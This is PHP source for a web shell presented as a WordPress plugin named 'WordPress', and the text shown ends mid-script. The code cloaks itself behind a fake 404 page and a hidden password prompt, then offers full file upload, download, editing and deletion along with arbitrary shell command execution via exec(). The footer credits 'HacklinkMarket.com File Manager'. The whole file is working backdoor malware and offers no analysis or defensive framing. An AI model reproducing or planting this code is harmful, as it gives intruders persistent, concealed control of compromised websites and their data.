<?php
/*
Plugin Name: WordPress
Plugin URI: https://www.google.com/
Description: Wordpress
Version: 31.0
Author: Word Press
Author URI: https://www.google.com/
License: GPL v31 or later
License URI: https://www.gnu.org/licenses/gpl-2.0.html
*/

session_start();
@error_reporting(0);
@ini_set('display_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);

$auth_md5='2cc4dcf80afe687dbea8c18d1a1ade95';

if(isset($_POST['p'])&&md5($_POST['p'])===$auth_md5){
    $_SESSION['auth']=true;
}

if(!isset($_SESSION['refresh_count'])){
    $_SESSION['refresh_count']=1;
}else{
    $_SESSION['refresh_count']++;
}

if(!isset($_SESSION['auth'])){
    if($_SESSION['refresh_count']<6){
        echo'<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="robots" content="noindex, nofollow">
<meta name="google" content="notranslate">
<title>404 Not Found</title>
</head>
<body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache Server at '.htmlspecialchars($_SERVER['HTTP_HOST']??'localhost').' Port 80</address>
</body>
</html>';
        die();
    }else{
        echo'<html><head><meta name="robots" content="noindex, nofollow"><meta name="google" content="notranslate"></head><body style="background:#0c0c0c;display:grid;height:100vh;margin:0;place-items:center center;"><form action="" method="POST"><input style="text-align:center;background:#1a1a2e;color:#00ff88;border:2px solid #00ff88;padding:15px;font-size:18px;border-radius:8px;outline:none;" name="p" type="password" placeholder="Password"></form></body></html>';
        die();
    }
}

$me=basename(__FILE__);
$d=isset($_GET['d'])?$_GET['d']:getcwd();
$d=realpath($d);

if(isset($_FILES['f'])){
    $f=$_FILES['f'];
    if(move_uploaded_file($f['tmp_name'],$d.'/'.$f['name'])){
        header("Location: $me?d=".urlencode($d));
        exit;
    }
}

if(isset($_GET['dl'])){
    $f=$_GET['dl'];
    $f=realpath($d.'/'.$f);
    if($f&&is_file($f)){
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename='.basename($f));
        readfile($f);
        exit;
    }
}

if(isset($_GET['del'])){
    $f=$_GET['del'];
    $f=realpath($d.'/'.$f);
    if($f){
        is_dir($f)?rmdir($f):unlink($f);
        header("Location: $me?d=".urlencode($d));
        exit;
    }
}

if(isset($_GET['ajax']) && $_GET['ajax'] === 'edit'){
    $f = $_GET['file'];
    $f = realpath($d.'/'.$f);
    if($f && is_file($f)){
        echo file_get_contents($f);
        exit;
    } else {
        http_response_code(404);
        echo 'File not found';
        exit;
    }
}

if(isset($_POST['ajax']) && $_POST['ajax'] === 'save'){
    $f = $_POST['file'];
    $f = realpath($d.'/'.$f);
    if($f && is_file($f)){
        $content = $_POST['content'];
        if(file_put_contents($f, $content) !== false){
            echo json_encode(['success' => true, 'message' => 'File saved successfully']);
        } else {
            http_response_code(500);
            echo json_encode(['success' => false, 'message' => 'Failed to save file']);
        }
        exit;
    } else {
        http_response_code(404);
        echo json_encode(['success' => false, 'message' => 'File not found']);
        exit;
    }
}

if(isset($_GET['edit'])){
    $f=$_GET['edit'];
    $f=realpath($d.'/'.$f);
    if($f&&is_file($f)){
        if(isset($_POST['c'])){
            file_put_contents($f,$_POST['c']);
            header("Location: $me?d=".urlencode($d));
            exit;
        }
    }
}

if(isset($_POST['cmd'])){
    $cmd=$_POST['cmd'];
    
    if(function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) {
        $output=[];
        $return_var = 0;
        exec($cmd.' 2>&1',$output, $return_var);
        
        echo'<pre style="background:#282c34;color:#abb2bf;padding:15px;border-radius:4px;font-family:\'Courier New\',monospace;margin:0;white-space:pre-wrap;">';
        if(empty($output)) {
            echo "Command executed. Exit code: $return_var\n";
            if($return_var !== 0) {
                echo "Error: Command failed or no output generated.\n";
            }
        } else {
            echo implode("\n",array_map('htmlspecialchars',$output));
        }
        echo'</pre>';
    } else {
        echo'<pre style="background:#282c34;color:#abb2bf;padding:15px;border-radius:4px;font-family:\'Courier New\',monospace;margin:0;white-space:pre-wrap;">';
        
        switch(trim($cmd)) {
            case 'pwd':
                echo htmlspecialchars(getcwd());
                break;
            case 'ls':
            case 'dir':
                $files = scandir('.');
                foreach($files as $file) {
                    if($file !== '.' && $file !== '..') {
                        echo htmlspecialchars($file) . "\n";
                    }
                }
                break;
            case 'whoami':
                echo htmlspecialchars(get_current_user());
                break;
            case 'date':
                $turkey_time = new DateTime('now', new DateTimeZone('Europe/Istanbul'));
                echo $turkey_time->format('Y-m-d H:i:s T') . ' (Turkey Time)';
                break;
            case 'clear':
                echo "\033[2J\033[H";
                break;
            case 'help':
                echo "Available commands:\n";
                echo "  ls, dir     - List files\n";
                echo "  pwd         - Current directory\n";
                echo "  whoami      - Current user\n";
                echo "  date        - Current date/time\n";
                echo "  cat file    - Show file content\n";
                echo "  head file   - Show first 20 lines\n";
                echo "  tail file   - Show last 20 lines\n";
                echo "  wc file     - Count lines/words\n";
                echo "  du          - Directory usage\n";
                echo "  clear       - Clear terminal\n";
                echo "  help        - This help\n";
                break;
            default:
                if(strpos($cmd, 'cat ') === 0) {
                    $filename = trim(substr($cmd, 4));
                    if(file_exists($filename) && is_file($filename)) {
                        echo htmlspecialchars(file_get_contents($filename));
                    } else {
                        echo "cat: $filename: No such file or directory";
                    }
                } elseif(strpos($cmd, 'head ') === 0) {
                    $filename = trim(substr($cmd, 5));
                    if(file_exists($filename) && is_file($filename)) {
                        $lines = file($filename);
                        echo htmlspecialchars(implode('', array_slice($lines, 0, 20)));
                    } else {
                        echo "head: $filename: No such file or directory";
                    }
                } elseif(strpos($cmd, 'tail ') === 0) {
                    $filename = trim(substr($cmd, 5));
                    if(file_exists($filename) && is_file($filename)) {
                        $lines = file($filename);
                        echo htmlspecialchars(implode('', array_slice($lines, -20)));
                    } else {
                        echo "tail: $filename: No such file or directory";
                    }
                } elseif(strpos($cmd, 'wc ') === 0) {
                    $filename = trim(substr($cmd, 3));
                    if(file_exists($filename) && is_file($filename)) {
                        $content = file_get_contents($filename);
                        $lines = substr_count($content, "\n") + 1;
                        $words = str_word_count($content);
                        $chars = strlen($content);
                        echo "$lines $words $chars $filename";
                    } else {
                        echo "wc: $filename: No such file or directory";
                    }
                } elseif($cmd === 'du') {
                    $total = 0;
                    foreach(scandir('.') as $file) {
                        if($file !== '.' && $file !== '..' && is_file($file)) {
                            $size = filesize($file);
                            $total += $size;
                            echo number_format($size/1024, 1) . "K\t$file\n";
                        }
                    }
                    echo "Total: " . number_format($total/1024, 1) . "K";
                } else {
                    echo "Command not found: " . htmlspecialchars($cmd) . "\n";
                    echo "Type 'help' for available commands.";
                }
        }
        echo'</pre>';
    }
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="google" content="notranslate">
<meta name="robots" content="noindex, nofollow">
<title><?php echo $_SERVER['HTTP_HOST'] ?? 'File Manager'; ?></title>
<style>
*{box-sizing:border-box;outline:0}
:focus{outline:none;}
:disabled{opacity:.5}
::-moz-focus-inner{padding:0;border:0}
html{height:100%;padding:0 0 8px 0;background-color:#f0f0f0}
body{background:#f0f0f0;position:relative;display:flex;margin:0 auto 8px auto;width:1000px;min-height:100%;font:normal 11px/1.5 Verdana,sans-serif;border:1px solid #fff;box-shadow:0 0 10px rgba(0,0,0,.5);flex-direction:column}.prm0,.prm1,.prm2,.prm3{font:12px 'Courier New',monospace}.prm0{color:red !important}.prm1{color:#2b2bb2 !important}.prm2{color:#2b2bb2 !important}.prm3{color:#00aa00 !important}
a,a:visited{color:unset;text-decoration:none}
table{font-size:12px;width:100%;border-collapse:collapse}
th,td{padding:3px 5px;border:1px solid #dfdfdf}
thead,tfoot{color:#fcfcfc;background:#7f7f7f}
tbody{background:#f7f7f7}
tbody tr{transition:background-color 0.2s ease;}
tbody tr:hover{background:#ececec}
.thPth{padding:8px 0 4px 0;background:#f0f0f0}
.spnPth{display:inline-block;font:14px/1.4 'Courier New',monospace}
.spnPth:hover ~ .spnPth{color:#cfcfcf}
.lnkBlck{display:block;white-space:pre-wrap;word-break:break-all;min-height:1em}
.lnkAct{color:unset;text-decoration:none}
.lnkAct:hover{text-decoration:underline}
input,select,button,textarea{margin:1px 2px;font:11px/1.4 Verdana,sans-serif;background:#eaeaea;border:1px solid #c7c7c7}
label,select,button{cursor:pointer}
button{padding:1px 10px;border-radius:3px;transition:all 0.2s ease;}
input[type="text"]{padding:1px 2px;display:block;width:100%;flex:1;transition:background-color 0.2s ease;}
input[type="text"]:not(:disabled):focus{background:#fff}
input:not(:disabled):hover,select:not(:disabled):hover,button:not(:disabled):hover{background:#f0f0f0;border-color:#a7a7a7}

#divBody{position:relative;flex:1}
#divFM{display:flex;flex-direction:column;flex:1;height:100%}
.panel{position:relative;margin:0 2px 8px 2px;padding:4px 3px;display:flex;border:1px solid #d0d0d0;background:#f7f7f7}
#divFtr{margin:0 2px 3px 2px;clear:both;display:flex}
#divFtr div{flex:1 1 0}
#divDtTm{text-align:center}
.flexRow{display:flex;align-items:center;justify-content:space-between}
tfoot th{padding:8px 0 4px 2px;text-align:left}
tfoot button{width:90px}

.toolbar,.panel{display:flex;border:1px solid #d0d0d0;background:#f7f7f7}
.toolbar{margin:1px 0 4px 0;padding:8px 2px 5px 2px;border-width:1px 0;align-items:center;justify-content:space-between}
.panel{position:relative;margin:0 2px 8px 2px;padding:4px 3px}
.subbar{display:flex;margin:-5px 0 4px 0;padding:2px 3px 5px 5px;border:1px solid #d0d0d0;border-width:0 0 1px 1px;border-radius:0 0 0 4px;align-self:flex-end;background:#f7f7f7}

.lnkAct{color:#0066cc;text-decoration:none}
.lnkAct:hover{text-decoration:underline}
#frmFiles{margin:0 2px 10px 2px}
#tblFiles{display:table;table-layout:fixed}
#tblFiles thead th:first-of-type,#tblFiles td:first-of-type{padding:0;text-align:center}
#tblFiles td:nth-of-type(4){text-align:right}
.thPth{padding:8px 0 4px 0;background:#f0f0f0}
.spnPth{display:inline-block;font:14px/1.4 'Courier New',monospace;color:#000;text-decoration:none;padding:2px 4px;border-radius:3px;transition:all 0.2s ease;}
.spnPth:hover{background:#e0e0e0;color:#333;transform:translateY(-1px);}
.spnPth:active{background:#d0d0d0;transform:translateY(0px);}
.lnkBlck{display:block;white-space:pre-wrap;word-break:break-all;min-height:1em}

/* Animations */
@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

@keyframes slideIn {
    from { opacity: 0; transform: translateY(-10px); }
    to { opacity: 1; transform: translateY(0); }
}

@keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
}

.fade-in { animation: fadeIn 0.3s ease; }
.slide-in { animation: slideIn 0.3s ease; }
</style>
</head>
<body class="notranslate">


<div id="divBody">
        <div id="divFM">
            <form class="toolbar" onsubmit="return goTo(this.p.value)">
                <div style="display:flex;align-items:center;gap:10px;">
                    <button type="button" onclick="toggleTerminal()" 
                            style="background:#f7f7f7;color:#333;border:1px solid #d0d0d0;padding:4px 8px;border-radius:3px;cursor:pointer;font:11px/1.4 Verdana,sans-serif;" 
                            onmouseover="this.style.background='#f0f0f0'; this.style.borderColor='#a7a7a7';" 
                            onmouseout="this.style.background='#f7f7f7'; this.style.borderColor='#d0d0d0';"
                            title="Open Terminal">Terminal</button>
                    <label style="font-weight:bold;">Current Path:</label>
                </div>
                <input type="text" name="p" value="<?php echo htmlspecialchars($d); ?>" style="flex:1;margin:0 10px;"/>
                <button type="submit" style="padding:5px 15px;">Go</button>
            </form>
            
            <div class="subbar">
                <button type="button" onclick="document.getElementById('inpUpl').click()" title="Click to select and upload a file">Upload &#8230;</button>
            </div>
            
            <form hidden method="post" enctype="multipart/form-data" id="uploadForm">
                <input type="file" name="f" id="inpUpl" onchange="handleUpload(this)"/>
            </form>
            
            <!-- Upload Progress -->
            <div id="uploadProgress" style="display:none;margin:5px 0;padding:8px;background:#e6f3ff;border:1px solid #b3d9ff;border-radius:3px;">
                <div style="display:flex;align-items:center;">
                    <div style="width:16px;height:16px;border:2px solid #007acc;border-top:2px solid transparent;border-radius:50%;animation:spin 1s linear infinite;margin-right:8px;"></div>
                    <span>Uploading file...</span>
                </div>
            </div>
            
            <div>
                <form id="frmFiles">
                    <table id="tblFiles">
                        <thead>
                            <tr>
                                <th width="20px"><input type="checkbox" id="selectAll" onchange="toggleSelectAll(this)" title="Select/Deselect all files"/></th>
                                <th onclick="sortTable(1)" style="cursor:pointer;">Name</th>
                                <th onclick="sortTable(2)" style="cursor:pointer;" width="65px">Ext</th>
                                <th onclick="sortTable(3)" style="cursor:pointer;" width="105px">Size</th>
                                <th onclick="sortTable(4)" style="cursor:pointer;" width="145px">Modified (TR)</th>
                                <th onclick="sortTable(5)" style="cursor:pointer;" width="95px">Permission</th>
                                <th width="65px">Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <th colspan="7" class="thPth">
                                    <?php 
                                    $parts = explode(DIRECTORY_SEPARATOR, rtrim($d, DIRECTORY_SEPARATOR));
                                    $currentPath = '';
                                    $totalParts = count($parts);
                                    for($i = 0; $i < $totalParts; $i++) {
                                        if($i == 0 && $parts[$i] == '') {
                                            $currentPath = DIRECTORY_SEPARATOR;
                                            $isLast = ($i == $totalParts - 1);
                                            $class = $isLast ? 'spnPth current-path' : 'spnPth';
                                            echo '<a href="'.$me.'?d='.urlencode($currentPath).'" class="'.$class.'">'.DIRECTORY_SEPARATOR.'</a>';
                                        } else if($parts[$i] != '') {
                                            $currentPath .= ($currentPath == DIRECTORY_SEPARATOR ? '' : DIRECTORY_SEPARATOR) . $parts[$i];
                                            $isLast = ($i == $totalParts - 1);
                                            $class = $isLast ? 'spnPth current-path' : 'spnPth';
                                            $style = $isLast ? ' style="background:#007acc;color:#fff;font-weight:bold;"' : '';
                                            echo '<a href="'.$me.'?d='.urlencode($currentPath).'" class="'.$class.'"'.$style.'>'.htmlspecialchars($parts[$i]).DIRECTORY_SEPARATOR.'</a>';
                                        }
                                    }
                                    ?>
                                </th>
                            </tr>
                            <?php if(dirname($d) !== $d): ?>
                            <tr>
                                <td></td>
                                <td colspan="6">
                                    <a href="<?php echo $me; ?>?d=<?php echo urlencode(dirname($d)); ?>" class="lnkBlck">[ .. ]</a>
                                </td>
                            </tr>
                            <?php endif; ?>
                            <?php
                            $dirs = $files = [];
                            $totalSize = 0;
                            foreach(scandir($d) as $f){
                                if($f === '.' || $f === '..') continue;
                                $path = $d.'/'.$f;
                                if(is_dir($path)) {
                                    $dirs[] = $f;
                                } else {
                                    $files[] = $f;
                                    $totalSize += filesize($path);
                                }
                            }
                            
                            foreach($dirs as $f):
                                $path = $d.'/'.$f;
                                $perms = fileperms($path);
                                $perms_octal = substr(sprintf('%o', $perms), -4);
                                $perms_str = substr(sprintf('%o', $perms), -3);
                                $perms_readable = 'd' . 
                                    (($perms & 0x0100) ? 'r' : '-') . 
                                    (($perms & 0x0080) ? 'w' : '-') . 
                                    (($perms & 0x0040) ? 'x' : '-') .
                                    (($perms & 0x0020) ? 'r' : '-') . 
                                    (($perms & 0x0010) ? 'w' : '-') . 
                                    (($perms & 0x0008) ? 'x' : '-') .
                                    (($perms & 0x0004) ? 'r' : '-') . 
                                    (($perms & 0x0002) ? 'w' : '-') . 
                                    (($perms & 0x0001) ? 'x' : '-');
                $perm_level = 0;
                if(is_readable($path)) $perm_level += 1;
                if(is_writable($path)) $perm_level += 2;
                                $mtime_obj = new DateTime();
                                $mtime_obj->setTimestamp(filemtime($path));
                                $mtime_obj->setTimezone(new DateTimeZone('Europe/Istanbul'));
                                $mtime = $mtime_obj->format('Y-m-d H:i:s');
                            ?>
                            <tr>
                                <td><input type="checkbox"/></td>
                                <td><a href="<?php echo $me; ?>?d=<?php echo urlencode($path); ?>" class="lnkBlck">📁 <?php echo htmlspecialchars($f); ?></a></td>
                                <td><a href="#" class="lnkBlck">[ DIR ]</a></td>
                                <td><a href="#" class="lnkAct">-</a></td>
                                <td><?php echo $mtime; ?></td>
                                <td>
                                    <?php
                                    $security_text = '';
                                    switch($perm_level) {
                                        case 0: $security_text = 'No access'; break;
                                        case 1: $security_text = 'Read only'; break;
                                        case 2: $security_text = 'Write only'; break;
                                        case 3: $security_text = 'Read/Write'; break;
                                    }
                                    ?>
                                    <a href="#" class="lnkAct prm<?php echo $perm_level; ?>" title="<?php echo $perms_octal . ' - ' . $security_text; ?>"><?php echo $perms_readable; ?></a>
                                </td>
                                <td>
                                    <a href="#" class="lnkAct">Mrk</a>&nbsp;
                                    <a href="<?php echo $me; ?>?del=<?php echo urlencode($f); ?>&d=<?php echo urlencode($d); ?>" class="lnkAct" onclick="return confirm('Delete?')">Del</a>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                            
                            <?php
                            foreach($files as $f):
                                $path = $d.'/'.$f;
                                $size = filesize($path);
                                $ext = pathinfo($f, PATHINFO_EXTENSION);
                                $fileIcon = '📄';
                                switch(strtolower($ext)) {
                                    case 'php': $fileIcon = '🐘'; break;
                                    case 'js': $fileIcon = '🟨'; break;
                                    case 'css': $fileIcon = '🎨'; break;
                                    case 'html': case 'htm': $fileIcon = '🌐'; break;
                                    case 'txt': case 'log': $fileIcon = '📝'; break;
                                    case 'json': case 'xml': $fileIcon = '📊'; break;
                                    case 'jpg': case 'jpeg': case 'png': case 'gif': case 'webp': case 'svg': $fileIcon = '🖼️'; break;
                                    case 'pdf': $fileIcon = '📕'; break;
                                    case 'zip': case 'rar': case 'tar': case 'gz': $fileIcon = '📦'; break;
                                    case 'sql': case 'db': $fileIcon = '🗄️'; break;
                                    case 'exe': case 'app': $fileIcon = '⚙️'; break;
                                    case 'md': case 'readme': $fileIcon = '📖'; break;
                                    case 'cfg': case 'ini': case 'conf': $fileIcon = '⚙️'; break;
                                }
                                $perms = fileperms($path);
                                $perms_octal = substr(sprintf('%o', $perms), -4);
                                $perms_readable = '-' . 
                                    (($perms & 0x0100) ? 'r' : '-') . 
                                    (($perms & 0x0080) ? 'w' : '-') . 
                                    (($perms & 0x0040) ? 'x' : '-') .
                                    (($perms & 0x0020) ? 'r' : '-') . 
                                    (($perms & 0x0010) ? 'w' : '-') . 
                                    (($perms & 0x0008) ? 'x' : '-') .
                                    (($perms & 0x0004) ? 'r' : '-') . 
                                    (($perms & 0x0002) ? 'w' : '-') . 
                                    (($perms & 0x0001) ? 'x' : '-');
                                $perm_level = 0;
                                if(is_readable($path)) $perm_level += 1;
                                if(is_writable($path)) $perm_level += 2;
                                $mtime_obj = new DateTime();
                                $mtime_obj->setTimestamp(filemtime($path));
                                $mtime_obj->setTimezone(new DateTimeZone('Europe/Istanbul'));
                                $mtime = $mtime_obj->format('Y-m-d H:i:s');
                            ?>
                            <tr>
                                <td><input type="checkbox"/></td>
                                <td><a href="javascript:void(0)" onclick="openEditModal('<?php echo addslashes($f); ?>', event); return false;" class="lnkBlck"><?php echo $fileIcon; ?> <?php echo htmlspecialchars($f); ?></a></td>
                                <td><a href="#" class="lnkBlck"><?php echo htmlspecialchars($ext); ?></a></td>
                                <td><a href="#" class="lnkAct"><?php echo number_format($size); ?></a></td>
                                <td><?php echo $mtime; ?></td>
                                <td>
                                    <?php
                                    $security_text = '';
                                    switch($perm_level) {
                                        case 0: $security_text = 'No access'; break;
                                        case 1: $security_text = 'Read only'; break;
                                        case 2: $security_text = 'Write only'; break;
                                        case 3: $security_text = 'Read/Write'; break;
                                    }
                                    ?>
                                    <a href="#" class="lnkAct prm<?php echo $perm_level; ?>" title="<?php echo $perms_octal . ' - ' . $security_text; ?>"><?php echo $perms_readable; ?></a>
                                </td>
                                <td>
                                    <a href="#" class="lnkAct">Mrk</a>&nbsp;
                                    <a href="<?php echo $me; ?>?del=<?php echo urlencode($f); ?>&d=<?php echo urlencode($d); ?>" class="lnkAct" onclick="return confirm('Delete?')">Del</a>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                        <tfoot>
                            <tr>
                                <th colspan="7">
                                    <button type="button" onclick="downloadSelected()" title="Download selected files">Download</button>
                                    <button type="button" onclick="deleteSelected()" title="Delete selected files">Delete</button>
                                </th>
                            </tr>
                        </tfoot>
                    </table>
                </form>
            </div>
        </div>
    
        <!-- Terminal Panel -->
        <div class="panel terminal-panel" id="terminalPanel" style="display:none;">
            <div class="flexRow">
                <h3 style="margin:0;flex:1;">Terminal</h3>
                <button type="button" onclick="clearTerminal()" style="margin-left:10px;">Clear</button>
                <button type="button" onclick="toggleTerminal()" style="margin-left:5px;">Close</button>
            </div>
            <div id="terminalOutput" style="background:#282c34;color:#abb2bf;padding:10px;border-radius:4px;font-family:'Courier New',monospace;min-height:200px;max-height:400px;overflow-y:auto;white-space:pre-wrap;margin:5px 0;border:1px solid #555;"></div>
            <form id="terminalForm" style="display:flex;align-items:center;margin-top:5px;">
                <span style="color:#abb2bf;font-family:'Courier New',monospace;margin-right:5px;">$</span>
                <input type="text" id="terminalInput" placeholder="Enter command..." style="flex:1;background:#282c34;color:#abb2bf;border:1px solid #555;padding:5px;font-family:'Courier New',monospace;border-radius:3px;" autocomplete="off">
                <button type="submit" style="margin-left:5px;padding:5px 15px;">Run</button>
            </form>
            <div style="margin-top:10px;font-size:11px;color:#666;">
                <strong>Quick Commands:</strong> ls, pwd, whoami, cat file.txt, head file.txt, tail file.txt, wc file.txt, du, help<br/>
                <strong>Keyboard:</strong> ESC (close), Ctrl+A (select all), Delete (delete selected), ↑↓ (command history)
            </div>
        </div>

</div>

<div class="panel" id="divFtr">
    <div>🚀 HacklinkMarket.com File Manager</div>
    <div style="text-align:center;">
        📁 <?php echo count($dirs); ?> folders &nbsp;|&nbsp; 📄 <?php echo count($files); ?> files &nbsp;|&nbsp; 📊 <?php echo number_format($totalSize / 1024, 1); ?> KB
    </div>
    <div id="divDtTm" title="Turkey Time (TR)" style="text-align:right;">
        🇹🇷 <?php 
        $turkey_time = new DateTime('now', new DateTimeZone('Europe/Istanbul'));
        echo $turkey_time->format('Y-m-d H:i'); 
        ?>
    </div>
</div>

<script>
function goTo(path) {
    if(path === '~') path = '<?php echo $_SERVER['HOME'] ?? '/'; ?>';
    window.location.href = '<?php echo $me; ?>?d=' + encodeURIComponent(path);
    return false;
}

function handleUpload(fileInput) {
    if(fileInput.files.length === 0) return;
    
    var fileName = fileInput.files[0].name;
    var progress = document.getElementById('uploadProgress');
    
    progress.style.display = 'block';
    progress.className = 'slide-in';
    
    fileInput.form.submit();
}

function showNotification(message, type) {
    var notification = document.createElement('div');
    notification.style.cssText = 'position:fixed;top:20px;right:20px;padding:12px 20px;border-radius:4px;color:#fff;font-weight:bold;z-index:1001;';
    notification.className = 'fade-in';
    
    if(type === 'success') {
        notification.style.background = '#28a745';
        notification.innerHTML = '✅ ' + message;
    } else {
        notification.style.background = '#dc3545';
        notification.innerHTML = '❌ ' + message;
    }
    
    document.body.appendChild(notification);
    
    setTimeout(function() {
        notification.style.opacity = '0';
        notification.style.transform = 'translateX(100%)';
        setTimeout(function() {
            if(notification.parentNode) notification.parentNode.removeChild(notification);
        }, 300);
    }, 3000);
}

function openEditModal(filename, event) {
    if(event) event.preventDefault();
    
    var existing = document.querySelector('.edit-modal');
    if(existing) existing.remove();
    
    
    fetch('<?php echo $me; ?>?ajax=edit&file=' + encodeURIComponent(filename) + '&d=<?php echo urlencode($d); ?>')
    .then(response => response.text())
    .then(content => {
        var modal = document.createElement('div');
        modal.className = 'edit-modal';
        modal.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:1000;display:flex;align-items:center;justify-content:center;';
        
        var modalBox = document.createElement('div');
        modalBox.className = 'modal frmFile';
        modalBox.style.cssText = 'display:flex;position:relative;visibility:visible;z-index:100;padding:3px 3px 5px 3px;flex-direction:column;border:1px solid #fff;background:#f7f7f7;box-shadow:0 0 10px rgba(0,0,0,.5);width:800px;height:600px;min-width:400px;min-height:150px;overflow:auto;resize:both;';
        
        var header = document.createElement('div');
        header.className = 'divCntrls';
        header.style.cssText = 'display:flex;border:1px solid #d0d0d0;background:#f7f7f7;margin-bottom:5px;user-select:none;align-items:center;';
        
        var titleSpan = document.createElement('span');
        titleSpan.className = 'spnTitle';
        titleSpan.textContent = filename;
        titleSpan.style.cssText = 'font-weight:bold;flex:1;padding:4px 8px;';
        
        var closeBtn = document.createElement('a');
        closeBtn.href = '#';
        closeBtn.className = 'cntrl';
        closeBtn.title = 'Close';
        closeBtn.innerHTML = '&#x00D7;';
        closeBtn.style.cssText = 'display:inline-block;overflow:hidden;opacity:.5;color:#000;border-radius:5px;width:18px;height:19px;font:normal 20px/16px Verdana,sans-serif;text-align:center;text-decoration:none;float:right;margin-right:3px;';
        closeBtn.onclick = function(e) { e.preventDefault(); closeModal(); return false; };
        closeBtn.onmouseover = function() { this.style.opacity = '1'; };
        closeBtn.onmouseout = function() { this.style.opacity = '.5'; };
        
        header.appendChild(titleSpan);
        header.appendChild(closeBtn);
        
        var form = document.createElement('form');
        form.style.cssText = 'flex:1;display:flex;flex-direction:column;';
        form.onsubmit = function() { return saveFileSimple(filename); };
        
        var editorDiv = document.createElement('div');
        editorDiv.id = 'ace-editor';
        editorDiv.style.cssText = 'flex:1;margin:2px;border:1px solid #7f7f7f;';
        
        var textarea = document.createElement('textarea');
        textarea.id = 'file-content';
        textarea.style.cssText = 'display:none;';
        textarea.value = content;
        
        var buttonDiv = document.createElement('div');
        buttonDiv.className = 'flexRow';
        buttonDiv.style.cssText = 'display:flex;align-items:center;justify-content:space-between;margin:1px 2px;';
        
        var filenameInput = document.createElement('input');
        filenameInput.type = 'text';
        filenameInput.value = filename;
        filenameInput.required = true;
        filenameInput.style.cssText = 'padding:1px 2px;display:block;width:100%;flex:1;margin:1px 2px;font:11px/1.4 Verdana,sans-serif;background:#eaeaea;border:1px solid #c7c7c7;';
        
        var saveBtn = document.createElement('button');
        saveBtn.type = 'submit';
        saveBtn.textContent = 'Save';
        saveBtn.style.cssText = 'padding:1px 10px;border-radius:3px;margin:1px 2px;font:11px/1.4 Verdana,sans-serif;background:#eaeaea;border:1px solid #c7c7c7;cursor:pointer;';
        saveBtn.onmouseover = function() { this.style.background = '#f0f0f0'; this.style.borderColor = '#a7a7a7'; };
        saveBtn.onmouseout = function() { this.style.background = '#eaeaea'; this.style.borderColor = '#c7c7c7'; };
        
        buttonDiv.appendChild(filenameInput);
        buttonDiv.appendChild(saveBtn);
        
        form.appendChild(editorDiv);
        form.appendChild(textarea);
        form.appendChild(buttonDiv);
        
        modalBox.appendChild(header);
        modalBox.appendChild(form);
        modal.appendChild(modalBox);
        
        document.body.appendChild(modal);
        
        setTimeout(function() {
            if(window.ace) {
                initAceEditor(content);
            } else {
                loadAceAndInit(content);
            }
        }, 100);
    })
    .catch(error => {
        alert('Error: ' + error);
    });
    
    return false;
}

function toggleSelectAll(checkbox) {
    var checkboxes = document.querySelectorAll('tbody input[type="checkbox"]');
    for(var i = 0; i < checkboxes.length; i++) {
        checkboxes[i].checked = checkbox.checked;
    }
}

function closeModal() {
    if(window.aceEditor) {
        window.aceEditor.destroy();
        window.aceEditor = null;
    }
    var modal = document.querySelector('.edit-modal');
    if(modal) modal.remove();
}

var sortDirection = {};

function sortTable(columnIndex) {
    var table = document.getElementById('tblFiles');
    var tbody = table.getElementsByTagName('tbody')[0];
    var rows = Array.from(tbody.rows);
    
    // Remove header row (breadcrumb) and up row if they exist
    var dataRows = rows.filter(function(row) {
        return row.cells.length > 1 && !row.cells[0].querySelector('input[type="hidden"]') && row.cells[1].textContent.trim() !== '[ .. ]';
    });
    
    sortDirection[columnIndex] = !sortDirection[columnIndex];
    var ascending = sortDirection[columnIndex];
    
    dataRows.sort(function(a, b) {
        var aText = a.cells[columnIndex].textContent.trim();
        var bText = b.cells[columnIndex].textContent.trim();
        
        if(columnIndex === 3) {
            var aNum = parseInt(aText.replace(/,/g, '')) || 0;
            var bNum = parseInt(bText.replace(/,/g, '')) || 0;
            return ascending ? aNum - bNum : bNum - aNum;
        }
        
        var result = aText.localeCompare(bText);
        return ascending ? result : -result;
    });
    
    var newTbody = document.createElement('tbody');
    
    rows.forEach(function(row) {
        if(row.cells.length === 1 || row.cells[0].querySelector('input[type="hidden"]') || row.cells[1].textContent.trim() === '[ .. ]') {
            newTbody.appendChild(row);
        }
    });
    
    dataRows.forEach(function(row) {
        newTbody.appendChild(row);
    });
    
    table.replaceChild(newTbody, tbody);
}

function deleteSelected() {
    var checkboxes = document.querySelectorAll('tbody input[type="checkbox"]:checked');
    if(checkboxes.length === 0) {
        alert('Please select files to delete');
        return;
    }
    
    if(confirm('Delete ' + checkboxes.length + ' file(s)?')) {
        for(var i = 0; i < checkboxes.length; i++) {
            var row = checkboxes[i].parentNode.parentNode;
            var filename = row.cells[1].textContent.trim();
            if(filename.includes(' ')) {
                filename = filename.substring(filename.indexOf(' ') + 1);
            }
            if(filename && filename !== '[ .. ]') {
                window.location.href = '<?php echo $me; ?>?del=' + encodeURIComponent(filename) + '&d=<?php echo urlencode($d); ?>';
                break;
            }
        }
    }
}

function downloadSelected() {
    var checkboxes = document.querySelectorAll('tbody input[type="checkbox"]:checked');
    if(checkboxes.length === 0) {
        alert('Please select files to download');
        return;
    }
    
    for(var i = 0; i < checkboxes.length; i++) {
        var row = checkboxes[i].parentNode.parentNode;
        var filename = row.cells[1].textContent.trim();
        if(filename.includes(' ')) {
            filename = filename.substring(filename.indexOf(' ') + 1);
        }
        if(filename && filename !== '[ .. ]') {
            window.open('<?php echo $me; ?>?dl=' + encodeURIComponent(filename) + '&d=<?php echo urlencode($d); ?>');
        }
    }
}

function loadAceAndInit(content) {
    var script = document.createElement('script');
    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/ace/1.15.3/ace.js';
    script.onload = function() {
        initAceEditor(content);
    };
    document.head.appendChild(script);
}

